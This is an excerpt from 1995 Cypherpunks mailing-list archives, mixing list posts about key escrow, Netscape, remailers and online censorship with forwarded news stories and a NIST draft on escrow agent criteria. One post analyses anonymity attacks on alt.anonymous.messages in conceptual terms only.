discussions of everything from choosing locks and keys to

      I do. I regard the capacity to do so as crucial, and I regard the
fact that you *don't* expect them to as very telling. As has been pointed
out extensively, the chances that he'll manage to hang on to his
soft-earned cash until he can sell out are a long shot--unless he takes a
stand against GAK. Governmental policy on the subject of crypto has relied
upon secrecy, obscurity, and above all terrorizing individuals; the gov't
would be extremely reluctant to throw the book Netscape, given its
symbolic significance in the market. And even if it did, Clark's future
would be assured--maybe after he got out of Club Fed, but assured
      Let me be clear: if Clark and Netscape said "We're implementing and
releasing a version with a key length we support," crypto policy would be
the lead story on the evening news--and the gov't would lose. The only
question is how fast.       You set forth all these silly generalities as though they suggest
that NS's best bet--for Clark, for itself, for the public--is to go along

      Like many entrepreneurs, he is an opportunist in every sense, good

NS's stance re GAK is a golden opportunity for Mr. Bubble either to
graduate or to get popped: either patted on the back by Papa State or
popped in the noggin. When "opportunity" is at stake, he's a shrewd
maneuverer; but when pitting his integrity against federal charges is at
stake, he's still a kid -- he doesn't see the opportunity in it.

relations can become *very* adversarial. Here's the question: is the dog
gonna wag the tail or vice versa? The USG has, as we all know,

hardened opposition, whether announced or de facto. NS is in a privileged
position to drag the LEA establishment onto the mat, with the whole of the
American public watching. And it stands to gain from doing so, as do we

he's looking for models, names like Carnegie and and Bismarck come to
mind. (Note that their progeny *still* have money, not 2 years later but
*generations* later.)
      On the contrary, it is sheer speculation that negotiations about GAK
*haven't* been going on. This shit doesn't happen by magic.
      Yes.
      Yes.

      NS should implement strong crypto, make it publicly available by FTP
and in a box, and see how the USG responds. The public is on its side.
      Yes.
      Because it isn't interested in freedom, here or anywhere else. It is
interested in a "controlled burn" distribution of stability and

amply demonstrated.

he claims to have, when I will start wrapping PGP-encrypted mail in
pretty-looking wrappers. That's when we'll have no one but ourselves to
blame. Not even Netscape.

US Marine chiefs trade places to experience tranche warfare
Officers are preparing to do virtual battle in the Nymex oil
pits [and wargame FinCide]
By Laurie Morse
A dozen US Marine Corps generals and colonels will today march
on to the New York Mercantile Exchange trading floor and start
matching wits with commodity futures traders.
The traders often describe their fraught existence in the
trading rings as virtual warfare, and the US military appears
to agree.
Keen to find ways of training officers to cope with the
demands of high-tech 21st-century warfare, a group of Marine
Corps top brass will venture into the Nymex crude oil pit in
the World Trade Center after the regular market has closed.
Assisted by a group of handpicked veteran commodity traders,
the marines will plunge into a simulated session of futures
trading that will include several market reversals and a
barrage of oil-linked "news".
Mr Gary Lapayover, the Nymex trader co-ordinating the event,
says the trading session will allow the officers and traders
to become acquainted on friendly turf, and give the Marines a
glimpse of the multiple tasks and the speed -- that breakneck
trading entails.
Today's simulated trading will be followed tomorrow by a war
games session. About 15 traders will follow the generals to an
old officers' club on Governor's Island, off Manhattan, and
test their skills in a computerised game designed by Gama
Corp. a Virginia-based company that specialises in
computer-generated battle scenarios.
Later, the traders will tell the officers and their aides what
they think of the battle experience.
What do the Marines hope to learn from the commodities pits?
"Our vision of what warfare will be in the 21st century is
very different from what we've faced in the 20th," says
Colonel Tom Harkins, director of operations at the Marines'
war-fighting laboratory in Quantico, Virginia.
In future, the Marines expect to be drawn into smaller
conflicts of the type seen in Somalia and Bosnia. At the same
time, warfare will become increasingly digitalised, calling
for rapid decision-taking amid a barrage of information.
"How does a commander make decisions on a digital
battlefield?" asks Col Harkins. "Technology will increase the
tempo of battle, and the influx of digital information will
require skills in what you might call pattern analysis. This
is what futures traders do. In this exercise we want to see
how people who face these conditions every day deal with the
stress, and get comfortable with the risks."
During tomorrow's war games, traders will be confronted by an
on-screen battle area laid out on a grid, with as many as 50
small teams of cyber-soldiers seeking the "enemy".
Once "contact" is made, the teams will request firepower.
Under pressure, "commanders" must decide how to deploy
resources to the best strategic advantage, while limiting
For Mr Eric Bolling, an independent trader who has survived
nine years in the Nymex energy pits, the Marines are being
shrewd in seeking to cross laser-swords with battle-hardened
heroes of the trading pits.
Mr Bolling, a 33-year-old former minor league baseball player,
has no military background, but sees a lot of parallels
between trading, sport and the armed services. All three
require high levels of self-motivation and decision-making
Some of the generals and colonels may be shown to be more
suited to high-stress, high-stakes environments than others,
he says. "You have to be able to prioritise and analyse a lot
of information rapidly -- then initiate risk by making a
decision; and, finally, manage that risk by having the
discipline to manage the trade," says Mr Bolling.
"A lot of people can't do that, and wash out of these markets.
I don't think it's something that can be learned really --
it's a personality type."
Mr Lapayover said he selected floor veterans like Mr Bolling
to participate because he was looking for "survivors" people
who have been successful traders over a number of years.
"Military experience wasn't a factor. The Marines are looking
for people that can help them understand the process."
Mr Lapayover has also suggested that the top brass visit the
"war rooms" of America's largest investment banks to observe
Wall Street's fixed income and equities traders, and the
strategies of high-stakes corporate raiders.
The war games are part of a new programme directed by General
Charles Krulak, commandant of the Marine Corps.
"War games are not designed to give you a total solution, they
are designed to give you insight" he says. "We're going to
have our laboratory analysts with us, and they will be looking
at improving the process."

Perhaps they've worked for a corporation? :-)
Certainly. In many organizations, the people who set policy, and the people
who "run" the corporation are not the same. Often important managers
disagree on issues or on how to achieve them. Individuals within the company
are often focused more on their careers and position within the company,
than on the affect their decisions have outside the company.
To equate an organization, especially a large one, with its constituent
parts ensures that you will be continually surprised by its complex and
unpredictable behavior.
BTW, the crypto relevance of this thread is nil.

meeting (12/5/95 5:49 PM):
      (Thanks for the summary, Pat.)
      This last bit is really rich. I can't think of a single publically
defensible reason for the stipulation that every escrow agent must employ
someone with SECRET clearance, but I *can* think of a publically
indefensible reason for it -- to facilitate those spooky non-court wiretap
authorizations that've been alluded to in the fine print of the GAK
      Of course, just because escrow agents would be required to hire
*someone* with a SECRET clearance doesn't mean that *anyone* with a SECRET
clearance would fill the bill. And that's the rub: the administration of
clearing people-with-SECRET-clearances for escrow agent employment would
be conducted -- where else? -- *in secret*. SECRET clearance, of course,
wouldn't be the salient criterion; after all, there are people on the
Cypherpunks list -- and a few who aren't on it but are like-minded --
who'd be, uh, reluctant to deliver keys in the absence of a a wiretap
authorized by a judge.
      And, as a petty aside, it's nice to see that the gov't had cooked up
yet another way to force potentially legitimate businesses to pay its
stoolpigeons to chip away out our civil rights.

On-Line Society Angered by Plan to Curb Content
By Jared Sandberg
The latest move in Congress to curb "indecent" material on the
Internet triggered outrage and scorn in cyberspace, as on-line
users decried it as censorship and plotted ways to overturn
"Welcome to the age of electronic book burning," said Craig
Johnson, a consultant who worries that the term "indecent"
could be applied to literary works, publichealth and medical
exchanges, and serious discussion of AIDS and sexual behavior.
"It's not only ridiculous - it's unfair, un-American and
unconstitutional," said Eileen Kent, vice president of new
media at Playboy Enterprises Inc. She finds it
"incomprehensible" that the on-line version of Playboy could
be deemed illegal while the printed magazine isn't. "Are they
going to send me to jail and fine me a hundred grand because
I put a Playmate on the Net?" she asked. If so, "then I'm
House conferees hammering out a sweeping telecommunciations
bill voted 17-16 on Wednesday to make it illegal for anyone to
knowingly display indecent material that can be viewed by a
minor, punishable by a $100,000 fine and up to two years in
Yesterday, critics tried to counter punch. The American Civil
Liberties Union is preparing a court challenge on First
Amendment grounds. The Center for Democracy and Technology, a
cyberspace civil-liberties group, vows to do the same. On-line
services drafted a letter of protest to House Speaker Newt
Gingrich, who has opposed earlier attempts to impose
restrictions on Internet fare.
On-line advocates also are pushing for a new vote by the House
conferees to define just what "indecency" means. They are
hoping the 17-16 balance of the first vote is tenuous enough
to allow them to ease the restrictions in defining the terms.
Backed by the hectic lobbying efforts, Rep. Rick White of
Washington state, who favors a less-restrictive approach, and
allies have begun laboring to devise a limited definition of
indecency that would be acceptable to civil libertarians and
smut-fighters alike.
Without a clearer, limited definition, the "indecency"
standard faces the almost certain prospect of being struck
down by the courts as unconstitutional, the White forces
On-line experts, moreover, argue the latest measure could
create big problems and unintended consequences. If one 16-
year-old zaps lewd fare to another, could the sender be
imprisoned? If an adult makes a racy observation on an
electronic bulletin board and a minor tracks it down and reads
it, should the adult be punished?
Last week, America Online Inc., in an effort to strike
vulgarity from members' personal on-line "profiles," decided
to strike all uses of the word "breast" - and thereby erased
the biographies of scores of women who had breast cancer.
AOL "responded to the climate of fear created by Congress,"
Mike Godwin, legal counsel for the Electronic Frontier
Foundation. An AOL spokeswoman said the deletions were "a
mistake on our part."
Robert L. Smith, executive director of the Interactive
Services Association, said such snafus could occur more and
more as Internet access providers fret about whether their
so-called content might be deemed indecent. "It's going to
cause confusion, industry uncertainty and years of litigation,
which will result in Congress not solving the problems they
wanted to solve," Mr. Smith said.
The crackdown effort, moreover, may be fruitless in a global
computer network that reaches more than 150 countries. "Those
American laws don't apply to me," said Patrick Groeneveld, a
professor at Delft University in the Netherlands. Mr.
Groeneveld, who once ran a popular Internet archive that
included pornographic material, said Congress's efforts amount
to U.S. "imperialism."
"I didn't vote for America's congressmen," he said.
"Legislators and some consumers don't understand the
Internet," said Jerry Berman, executive director of the Center
for Democracy and Technology. "So, it becomes an easy target
for political posturing."

@_subject: Key Escrow Agent Criteria  [Draft] 
[From NIST 12-08-95]
The following draft discussion paper was distributed at the  12/5/95 meeting at NIST on draft criteria for 64-bit software key  escrow exportability.
                              DRAFT
                            (12/1/95)
                    Key Escrow Agent Criteria
An often heard concern regarding key escrow encryption is that  users of such encryption are vulnerable to abuse of the escrowed  key by the escrow agents or others.  Many have suggested that  changes in the law are needed that specifically, criminalize any  such abuses.  We agree that such laws will be beneficial in  deterring acts by anyone to access escrowed keys without  authority or to undermine the integrity of the escrow key system.
However, the availability of criminal prosecution is not alone  sufficient.  Key escrow agents must be selected not only with a  view toward assuring the availability of escrowed keys for  properly authorized government officials, but also to assure that  the escrow agents have the commitment and means to protect the  confidentiality and integrity of the keys they escrow and the  escrow system.  This will be particularly important if, as we  expect will occur, some key escrow products will be designed such  that the escrow agent could discern the identity of the user from  the keys and other information that is escrowed with them.
The following criteria were drafted with these principles in  mind.  We have not yet addressed conditions under which users can  be the sole repository of the keys for their system.  We  recognize that some organizations or people do not want anybody  but themselves to escrow their keys.  However, since an important  reason for escrowing is to preserve effective law enforcement, we  must assure authorized officials can reliably and timely obtain  access to escrowed keys through entities independent of the  subject of electronic surveillance.  Thus we welcome suggestions  on how best to meet this range of In considering the criteria appropriate for approving escrow  agents, we considered whether the government needs to assure it  has timely and reliable access when authorized and what key  escrow encryption users would want to ensure that the escrowing  of keys does not undermine their security.  Of course, the  government is also a user of key escrow encryption products and  shares with other users an interest to ensure the integrity and  security of the escrow system.  Similarly, organizations  interested in data recovery share the government's interest to  have a system through which access to escrowed key is enabled  under appropriate circumstances.  With these considerations in  mind, we developed criteria in two categories, "Escrow System  Integrity and Security" and "Key Access Requirements."  We expect  that prospective escrow agents that meet criteria such as these  would be considered as "approved" escrow agents for export  purposes, to hold keys for government systems, etc.
Note that keys and/or key components for devices that may process  classified information shall be escrowed with escrow agent  entities selected by the U.S. government, and that those escrow  agent entities may be required to meet more stringent  Escrow System Integrity and Security
1.   Escrow agent entities shall devise and institutionalize
     policies, procedures, and mechanisms to ensure the
     confidentiality, integrity, and availability of key escrow
     related information.
     a.   Escrow agent entities shall be designed and operated           that a failure by a single person, procedure, or
          mechanism does not compromise the confidentiality,
          integrity or availability of the key and/or key
          components (e.g., two person control of keys, split
          keys, etc.)
     b.   Unencrypted escrowed key and/or key components that           stored and/or transmitted electronically shall be
          protected (e.g., via encryption) using approved      c.   Unencrypted escrowed key and/or key components stored
          and/or transferred via other media/methods shall be
          protected using approved means (e.g., safes).
2.   Escrow agent entities shall ensure due form of escrowed      access requests and authenticate the requests for escrowed
     key and/or key components.
3.   Escrow agent entities shall protect against disclosure of
     information regarding the identity of the person/
     organization whose key and/or key components is requested,
     and the fact that a key and/or key component was requested
     or provided.
4.   Escrow agent entities shall enter keys/key components into
     the escrowed key database immediately upon receipt.
5.   Escrow agent entities shall ensure at least two copies of
     any key and/or key component in independent locations to
     help ensure the availability of such key and/or key
     components due to unforeseen circumstances.
6.   Escrow agent entities that are certified by the U.S.
     government shall work with developers of key escrow
     encryption products and support a feature that allows
     products to verify to one another that the products' keys
     have been escrowed with a U.S.-certified agent.
Key Access Requirements
7.   An escrow agent entity shall employ one or more persons      possess a SECRET clearance for purposes of processing
     classified (e.g., FISA) requests to obtain keys and/or key
     components.
8.   Escrow agent entities shall protect against unauthorized
     disclosure of information regarding the identity of the
     organization requesting the key or key components.
9.   Escrow agent entities shall maintain data regarding all      escrow requests received, key escrow components released,
     database changes, system administration accesses, and      of such events, for purposes of audit by appropriate
     government officials or others.
10.  Escrow agent entities shall maintain escrowed keys and/or
     key components for as long as such keys may be required to
     decrypt information relevant to a law enforcement
     investigation.
11.  Escrow agent entities shall provide key/key components to
     authenticated requests in a timely fashion and shall
     maintain a capability to respond more rapidly to emergency
     requirements for access.
12.  Escrow agent entities shall possess and maintain a
     Certificate of Good Standing from the State of      (or similar local/national authority).

Forwarding Cyberia-L mail by: hayam at actcom.co.il (Avraham Hayam) on Sat, 9 Dec  6:16 AM
The only way for E-Mail Privacy on the internet is - ENCRYPTION.  You don"t have to be an Internet Expert to understand that data which is not encrypted is open for every On Oct. 20 1995 Andy Jonson-Laird  sent a most interesting data to the list concerning that the user has absulutly no control ever how the data is routed. A Mail that he sent to an address which is at the distance of 11 miles actualy did 1200 miles.
It may be  " The end of days vision" that privacy will be maintained without encryption. With the ongoing danger from the Cypherpunks, we must use very strong Algorithms. A French "algorithms cracker" recommended not long ago that the commercial sector have to use not less than 128 bytes based I will appreciate to receive list members opinion.

@_subject: Congress vs. the Internet 
NY Times, 9 Dec 1995, Op-Ed.
Congress vs. the Internet
   The courts have upheld free speech. Why won't
   legislators?
By Shari Steele (EFF staff counsel)
San Francisco. While the courts continue to uphold the
freedom of speech on the Internet, the First Amendment is
under attack on Capitol Hill. On Wednesday, House members
of a House-Senate conference committee said they would
support a stringent new measure that would not only bar
words and ideas on the worldwide computer network that
one might hear on TV or read in this newspaper, but would
make criminals out of anyone transmitting these materials
electronically, including on-line servces.
This measure goes against the spirit of three sensible
court decisions on copyright law handed down in recent
weeks, all involving the Church of Scientology.
The first decision, issued by a Federal judge in
California last month, held that Internet service
providers, the gatekeepers to the information highway,
cannot be held liable for copyright infringement when
they have no knowledge of the content of their users'
This decision is important, because, like the telephone
company, the system's providers merely offer a conduit
for communications. If they can be held liable for the
content of messages, they are more likely to monitor
those messages and censor any that include language that
might get them in trouble.
Just as we don't want the phone company censoring our
telephone calls, we should be very troubled by any
copyright law interpretation that would assign liability
to those who provide Internet service.
The second and third decisions were issued last week by
a Federal judge in northern Virginia. In those cases, the
judge, Leonie M. Brinkema, admonished the Church of
Scientology for using lawsuits to silence its on-line
critics. After two of its former members posted
electronic criticism of Church of Scientology writings,
the church brought charges against them, their Internet
service providers and The Washington Post for including
two sentences from church documents in an article on the
Judge Brinkema dismissed The Washington Post and two of
its reporters from the suit and held the Church of
Scientology and its affiliate responsible for the
newspaper's legal fees. "Although the Religious
Technology Center brought the complaint under traditional
secular concepts of copyright and trade secret law, it
has become clear that a much broader motivation prevailed

@_subject: Warning about Pegasus Mail and PGP (fwd) 
Oh, PLEASE! Do you HAVE to go and mix up two completely
different issues? Aren't the nontechnical people trying to
follow these things likely to be confused enough without your
adding to that confusion? For every person who really understands the technical issues there are probably a thousand or ten thousand who are just trying to *use* the stuff without stepping into a deep hole.
An OS swap file is one kind of hole.  What Siberia is writing about is ANOTHER type of hole. If I wipe my swap file after each use of my machine and don't know that Pegasus is doing this, or think that because of what you wrote I'm no worse off, I've been done a serious disservice.
How about saying something USEFUL, like yes or no to the
question of whether sending WITHOUT queueing will make any
difference? How about agreeing that if David Harris hopes to
provide a useful interface to external "encryptors" he will
have to do something about this?  How about cc'ing David?
Somebody else could as well point out that we're all full of crap because we don't use Amigas, and while he might have a point, it wouldn't be a very useful one.

@_subject: GAK Query 
Steven Miller, in his "Civilizing Cyberspace," remarks in
his coverage of encryption issues that:
   ... the Administration is trying to split the [GAK]
   opposition by working with private industry groups on
   compromise escrow strategies that would let government
   agents see the contents of decoded messages without
   getting access to the escrowed key itself. [p. 306]
Does anyone know more about this tactic, whether it is
being pursued, or the legal and technical procedures for
decoding and seeing the messages?

    That is the correct response.
    What trick? For ~$150, you can buy a CD-ROM-set DB with every listed
phone number in the U.S. on it, faxes too; the info's rife with typos and has a lag of ~6-7 months, but what do you want? If you're willing to pay
more, you'll get more -- more accurate, more timely, more aggressively
correlated, more thorough info.
    Where's your new address, under a rock? ;)     Ironically, NFA status will get you on some very aggressive lists.
    [x] all of the above
    They are.
              ^^^^^^^
    Are you being serious? Ever heard of "information markets"? What,
are you a libertarian just because you don't like taxes? There are
other reasons for being one... :)

Here's one more reason to worry about the implications of web search
engines: I just stopped in on Digital's new Alta Vista page, and was
surprised to find that the query field was filled in--with a search I ran
3 or 4 days ago. I doublechecked my end pretty thoroughly (scrubbing all
the files that Netscape 2.0b3 [Mac] generates--caches, global history,
etc., and eventually reinstaling Netscape from scratch). And it look an
awful lot like Alta Vista cached by query according to my IP address.

Fred seems to have been slipping through my filters in recent days. Though I usually trash any message containing a reference to him, I thought that this latest escalation into the ionosphere of net-sillies begs to be brought to heel...
There are several things wrong with this, but first, just on
the surface: Fred has now dropped his cyberdrawers and stands
before us displaying the ugly engine of his manhood, the handle
by which he maintains a grip on his pointless existence. He
reveals himself to be yet another in that small, tired parade
of self-appointed lightning rods -- people with so little of
import in their lives that they have to resort to trolling for
what they can claim are offenses against them, then flex the
borrowed, imagined musculature of mindless law to rise in
self-righteous threats of exercise of vindictive wrath. This is worse than "My big brother will kick your ass!" It is
like a 90-pound weakling going to the beach with a large but
retarded cousin in tow. The idea is to troll to get sand kicked in his face, then to point to the drooling cousin and use him as a lever to gain and exercise control over the hapless dupes of the ruse.
Freds have existed on BBS's, and before the technological age in most small clubs and societies. In the Internet they show up in newsgroups and on mailing lists, and when crossed they ALWAYS descend to threats of legal action. So predictable, so utterly dull and unimaginative, they are like the party guest who has that inappropriate laugh, who doesn't seem to notice that pairs of people are together, who approaches people oddly and, in the end, makes a scene and reveals himself to be a complete fruitcake. Unmoderated fission looking for a place to Fred, you've come to the wrong place. If you want to be
ignored, just pack your terminal and stay home with the
sitcoms. Noone asked you to interject your trolls and threats
here. You invited yourself, and whatever you are suffering is of your own creation.
Speaking of Freds brings me to a more interesting aspect of this nonsense: How do we know there is only one Fred? Fred doesn't sign his messages...  oh-oh. This attack of deja vu feels like I've had it before.
Why do I get the feeling that Fred is about to embarrass himself terribly by blurting out some of the poison that fills his soul? Let him who hath not slandered cast the first suit.

January 3, 1995
     TO: INTERNET REMAILER OPERATORS
     FROM:  THOMAS M. SMALL
            COUNSEL FOR RELIGIOUS TECHNOLOGY CENTER AND BRIDGE
            PUBLICATIONS, INC.
          I  represent  Religious Technology Center ("RTC"), which
     owns the unpublished, confidential Advanced Technology of the
     religion of Scientology, and holds exclusive rights under the
     copyrights applicable to the Advanced  Technology  materials.
     I  also  represent Bridge Publications, Inc., which holds the
     exclusive  right  to  print,   publish   and   sell   various
     non-confidential  works  by  the  founder  of the Scientology
     religion,  L.   Ron  Hubbard,  and  to   make   and   publish
     compilations and derivative works of and from those works and
     to enforce all rights in them.
          It  has  come  to  my  attention  that  there  are   two
     alternate  newsgroups  on  the  Internet to which individuals
     have  been  annonymously  posting  certain  of  my   clients'
     published  and  unpublished  copyrighted materials, including
     certain of the confidential  Advanced  Technology  materials.
     These  confidential  materials  being posted were stolen from
     my client.  There is reason to  believe  that  the  materials
     which  are  uploaded by these users may also be downloaded by
     other users, and  that  these  activities  may  be  occurring
     through  the  systems  which  are  linked  into the Internet.
     The two newsgroups  into  which  these  materials  are  being
     copied    are   alt.technology.clearing   and   alt.religion.
     Scientology.
          We  request your assistance in dealing with the problem.
     The spread of  infringements  and  misappropriations  by  the
     users  will be lessened if you lock out from your systems the
     two   newsgroups   involved,   alt.religion.scientology   and
     alt.technology.clearing, limiting the potential for reposting
     and downloading.  It will then be easier  to  deal  with  the
     intentional infringers through appropriate channels.
          Both  the  uploading  and downloading of these materials
     constitute  unauthorized  copying  and  distribution  of  the
     materials  in  violation  of our clients' rights under United
     States copyright laws and the law of other  countries,  where
     applicable.    Damages  and  an  injunction  against  further
     unauthorized copying and distribution may be obtained against
     infringers and, all unauthorized copies and all materials and
     equipment by which the unauthorized copies may be  reproduced
     can   be   impounded.    Unauthorized   disclosure   of   the
     confidential  Advanced  Technology  materials  also  violates
     applicable trade secrets laws.
          Action  is  being  taken directly with the systems users
     who we know are primarily responsible for these violations of
     my clients' rights.  We hope those actions will put an end to
     the infringements by  these  users.   We  do  {not}  wish  to
     involve  others in  litigation.  Unfortunately, however, such
     actions will  be  unavoidable  where  there  is  contributory
     infringement  by  those who knowingly induce or contribute to
     the infringing conduct of these users by providing facilities
     or systems that enable the  direct  infringers  to  infringe,
     because  we  legally  must  take  all  actions to protect our
     clients'  property   rights.    Courts   are   holding   such
     contributory  infringers  liable.   Two  examples  are:  Sega
     Enterprises Ltd.  v.  Maphia BBS, 30 U.S.P.Q.  2d 1921  (N.D.
     Cal.   1994) and Playboy Enterprises v.  Frena, 839 F.  Supp.
     1152 (M.D.  Fla.  1993).
          Recent   proposed   legislation   regarding    potential
     liability   of  systems  operators  and  others  who  provide
     facilities or services, such  as  annonymous  remailers,  for
     information  passing through their systems has understandably
     created concern  on  the  part  of  systems  operators  as  a
     potential  liability.   We  ask  your voluntary assistance in
     dealing with these known wilful infringers  so  that  we  can
     both  deal  with the problem without legal hassles, and legal
     liability can be confined to those who intend to  create  the
     situation.
          We  ask that you confirm that you have blocked access to
     these newsgroups through your remailer.  If you are unwilling
     to  do  so,  we  ask that you inform us as to the reasons for
     your position.
                                             Sincerely,
                                             Thomas M. Small

@_subject: British Hacker Story 
From: newsbytes at clarinet.com (NB-LON)
   Subject: London Newspaper Runs Old "Superhacker" Story
   01/03/95
   Date: 3 Jan 95 20:44:22 GMT
   LONDON, ENGLAND, 1995 JAN 3 (NB) -- As the UK started back
   to work today after the long Christmas and New Year
   shutdown, readers of the Independent newspaper were treated
   to the banner headline "British Boy Raided US Defense
   Secrets."
   The curious thing about the story was that none of the
   other nationalpapers or news wires carried any reports. On
   investigation, Newsbytes discovered why -- the story dates
   back to July of last year, and briefly resurfaced in early
   November on the US news wires.
   According to the Independent, a 16-year-old British boy has
   been arrested in connection with a alleged unauthorized
   intrusions into the US government's computers and "was able
   to watch secret communications between US agents in North
   Korea during the crisis over nuclear inspections last
   spring."
   The story is quite correct, except that the boy in question
   was arrested last July, when the original story broke.
   Commenting on the story, Peter Sommer, a leading security
   consultant and a senior with the Computer Research Center
   at the London School of Economics, said that it smacked of
   the British Telecom secrets case of late November,also
   reported in the Independent.
   That story, as reported by Newsbytes, turned out to be
   something of a non-event when the hacker, who posted
   details of top secret files on BT's ex-directory computer
   "across the Internet," turned out to be Steve Fleming, a
   Scottish freelance journalist who worked as a temp for BT
   in the summer and broke BT's own security rules by
   downloading files from the BT's Customer Service System
   (CSS) computer, then mailed them -- across the Internet --
   to other people.
   "I'm amazed at the Independent running yet another story
   involving the Internet," Sommer told Newsbytes, adding that
   it is "a very old story. It seems that all they have to do
   is to work up a story about a hacking attempt, whether
   successful or not, and weave in a story about the Internet,
   and it's a headline story."
   Ken Young, newly installed editor of Communicate, a leading
   industry communications magazine in London, and a veteran
   of the UK communications industry for more than a decade,
   told Newsbytes that the story seemed a little thin.
   "It looks like another hacking story except that (the
   newspaper) has written in something about the Internet, and
   bingo! You've got a report that the information was
   accessible to 32 million users on the Internet," he said.
   Sommer, meanwhile, told Newsbytes that he had made his own
   discreet inquiries about the story with high level
   authorities when it broke last summer.
   "There are two problems with this case. Firstly, any lawyer
   worth his salt would invoke Section 69 of the Police &
   Criminal Evidence Act," he said. This Act, Sommer
   explained, requires that, before a computer can be
   considered as admissible evidence in court, the owner of
   the computer must issue a certificate of correct working.
   This, he said, could not be issued, as a casual user of a
   PC would be unable to make such a certification.
   Sommer went on to explain that the second reason that the
   case could be problematic for the prosecution was "that the
   lawyer would ask the court for full disclosure of all
   affected files on victim's host computers," which, since
   such files are almost certain to be classified in the US,
   could not be revealed in a British courtroom.
   The facts surrounding the case, as reported by Newsbytes,
   were that the 16-year-old -- operating under the code name
   of Data Stream -- was one of several who gained
   unauthorized access to the US defense computer network in
   late 1993 and early 1994 and that some files were deleted.
   At the time, press reports said that as many as a million
   passwords were compromised, and may have compromised the
   military readiness of the United States. The case has,
   Newsbytes understands, been fully investigated by the US
   Air Force Office of Special Investigations (OSI) although
   details of the report of the investigation by the USAF OSI
   are classified.
   Originally, the press reports of the time speculated
   whether the youth would be the first under-18 to be
   extradited to the US to face charges. It seems that,
   following last summer's arrest and submission of the report
   to the Crown Prosecution Service that the case is being
   quietly shuffled into a file because of the practical
   problems in pursuing a prosecution.

OSF Opens Software Web Mall For Java
Cambridge, MA, July 26 (NB) -- In a
teleconference today, the Open Software Foundation (OSF) plans to open an Open Software Mall on the Web on July 31, and start distributing software there this fall that will include Ports technology for the Web, DCE (Distributed Computing
Environment) Web, and Microkernel Unification Specification, a
new technology for building cross-platform applications.
At the teleconference, which was attended by Newsbytes, Dr. Ira
Goldstein, chief scientist and executive VP, said that the OSF the Open Software Mall as a place for users to access and help beta test new technologies like Java Ports, DCE Web, and
Microkernel Unification -- being sponsored by the OSF in
conjunction with major vendors -- as well as software from
universities and other research collaborators, and eventually,
outside "open systems" efforts that are "germane to core OSF
Java Ports, a series of ports of Sun's Java technology for the is being produced by the OSF with Sun, Hewlett-Packard, and Goldstein told the journalists and analysts. The technology will be
available on the Open Software Mall in September, he added.
DCE Web, an application designed to provide the Web with DCE
mechanism for encryption, access control, and naming, is a
collaborative project from the OSF, Hitachi, HP and AT&T.
DCE Web is "consistent with HTTP and secure HTTP," but able to
provide additional services to DCE sites, according to Microkernel Unification -- from the OSF, Hitachi, HP and IBM -- a technology for building cross-platform databases and other
applications by writing directly to a standard, common application programming interface (API).
IBM plans to produce a product that is "mostly compliant" with new specification in the product's first release, and compliant" in its second release, Goldstein noted.
Digital Equipment Corp. might also be participating in the

Responding to msg by perry at piermont.com ("Perry E. Metzger") on Wed, 01 Nov 11:51 AM
It's related to IBM's work on machine/code interface security, encryption and authentication capabilities. Cryptographers may want to examine how these work in Microkernal. If IBM will allow access to the features.
And it's related to parallel alarms sounded on cypherpunks about the impossibility of any durable security which does not anticipate ever-changing attacks devised by authors of competing products and services.
Finally, not your hat size, to be sure, it's related to the vanity of computer security consultants who dismiss unknown competition at the peril of their credibility.

alt.anonymous.messages considered harmful.
The advantage of using an anonymous message pool over using a chained
reply block is, of course, the huge number of potential recipients.
However, there are a number of problems, including a serious attack.
Some of them could be avoided with a slightly different approach.
1. When reading news on a server not under her direct control, Alice
lets leak information (article selection, time used per article),
so that she loses the additional security of using a message pool.
She can avoid this by processing alt.anonymous.messages off line.
2. By sending messages of a certain size and number to a pseudonymous
address, an attacker can find out that the pseudonymous user
participates in the pool: The encrypted messages are public;
encryption does not affect size and number of messages.
This information is also available at the alias server. That is not a
problem as such. Anonymity is protected by the size of the pool.
In combination with 1., this attack can lead to disclosure of a
3. Denial of service attack. If the attacker can delay or suppress
delivery of messages to a subset of the recipients, the pseudonym's
reaction to the message or lack thereof reveals which subset the user
belongs to. He can track down the pseudonym to Alice with O(log(n))
This is a practical attack, not restricted to a single point of failure
such as the local news server: Persons at well-connected Usenet sites
can send cancel (or superseding) messages with restricted distribution
by use of the Distribution: and Path: lines.
Those who do get the message, can not notice a cancel attack; those
who don't, would have to carefully search for suspicious Supersedes:
lines and monitor the control newsgroup. A denial of service attack by
manipulated Path: header cannot be detected by the victim.
Denial of service attacks could be made somewhat less feasible by
making the pool accessible as a mailing list and via http.
Some problems not related to security (such as restricted availability
and bogus cross-posted traffic in the newsgroup) could also be solved
by reproducing the encrypted posts to alt.anonymous.messages in a
mailing list.
Identification of encrypted messages as needed for 2. and helpful for
3. can be prevented by using a fixed-size message format and inserting
cover messages.
If these messages are numbered and signed by the alias server, users
can detect denial of service attacks (but not distinguish them from
network errors) and try to get the messages through another channel.
For perfect security, however, feedback from all participants would be
required during transmission of the message. This is hardly possible.
So, for highest security return addresses, an "everyone a remailer"
mix net might be the better solution.

The Wall Street Journal, October 31, 1995, p. B6. IBM Announces New Software Code That Is Universal
By Laurie Hays
International Business Machines Corp., in its effort to reduce
the importance of computer-operating systems, announced a new
kind of universal-software code called Microkernal that
enables software to work on incompatible hardware.
For software developers and businesses that want to develop
one set of codes to run applications on many different
machines, Microkernal offers an opportunity for the
long-touted open computing. A big challenge remains, however:
to market the technology and make a business case for software
developers to write for Microkernal in a world that is
dominated by Intel Corp. and Microsoft Corp.
"It's exciting technology, but it will be hard for them to
market," says Dan Kuznetsky, an analyst with International
Data Corp., a Framingham, Mass., market-research firm. "It's
also got a long way to go from what they've announced to the
Mr. Kuznetsky likens the technology to the development of a
great automobile transmission that has yet to be turned into
a truck or a car.
The key to Microkernal is a single source code base that
communicates between the hardware and the operating system.
One long-term possibility, for example, would be to make the
Apple Computer Inc.'s Maclntosh operating system work on an
Intel PC, impossible today because the two have different
design architectures that don't talk to each other.
IBM's delayed OS/2 operating system for the PowerPC chip,
which is expected to be shipped by the end of the year, will
be the first IBM offering for the Microkernal allowing
developers to move applications to the chip with only small
IBM so far has garnered a number of licensing agreements for
Microkernal, including Digital Equipment Corp., Maynard,
Mass., and LG Electronics, formerly the Korean electronics
concern Goldstar, as well as a number of universities.

European Firms Join Research Group In Bid to Guide
Internet Development
By Douglas Lavin
Paris - - Afraid of being frozen out of the booming
interest in the Internet, 20 European companies joined
together to form the European arm of an Internet research
The World Wide Web Consortium's European branch will work
with the U.S. Web consortium on such global issues as
electronic commerce, but it will also work on such
international issues as the use of languages other than
English on the Web, the multimedia portion of the
"We must assure that the beautiful springtime of the
World Wide Web is not also the autumn of the French
